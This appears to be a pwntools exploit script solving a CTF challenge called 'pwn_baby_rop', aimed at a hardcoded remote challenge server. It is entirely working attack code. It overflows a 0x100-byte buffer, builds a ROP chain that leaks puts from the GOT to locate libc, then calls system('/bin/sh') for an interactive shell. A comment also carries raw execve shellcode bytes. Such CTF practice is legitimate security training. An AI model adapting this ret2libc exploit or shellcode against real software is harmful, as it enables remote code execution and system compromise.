from pwn import *
import time
elf = ELF('/home/kali/Downloads/pwn_baby_rop')
#p=elf.process()

cyberedu = '35.246.235.205:30728'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
# read hex leak: 
# pie_leak = int(pie_leak, 16)

# read hex bytes: 
# val = u64(data.ljust(8, b"\x00"))

#local testing, run normally
#remote testing, run python3 exploit.py REMOTE

#strings libc.so.6 | grep "GNU C Library"
#strings libc.so.6 | grep "release version"

#print(".".join(f"%{i}$p" for i in range(1, 51)))
#shell = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' shortest shell

pop_rdi_ret = 0x401663
ret = 0x40101a
puts_got = elf.got[b'puts']
puts_plt = elf.plt[b'puts']
main = 0x040145c
print(f"puts_got is {hex(puts_got)} and puts_plt is {hex(puts_plt)}")

payload = ( b"A"*0x100 +
            b"B"*8 + 
            p64(pop_rdi_ret) +
            p64(puts_got) +
            p64(puts_plt) +
            p64(main)
          )
#gdb.attach(p, gdbscript = 'b * 0x4012bf')

p.recvuntil(b"magic.\n")
p.sendline(payload)

data = p.recvline().strip()
val = u64(data.ljust(8, b"\x00"))

print(f"Found puts at {hex(val)}")

io_puts_offset = 0x0875a0
system_offset = 0x055410
binsh_offset = 0x1b75aa

libc = val - io_puts_offset
system = libc + system_offset
binsh = libc + binsh_offset

print(f"Found libc at {hex(libc)}")

payload = ( b"A"*0x100 +
            b"B"*8 + 
            p64(pop_rdi_ret) +
            p64(binsh) +
            p64(ret) +
            p64(system)
          )
          
p.recvuntil(b"magic.\n")
p.sendline(payload)

p.interactive()
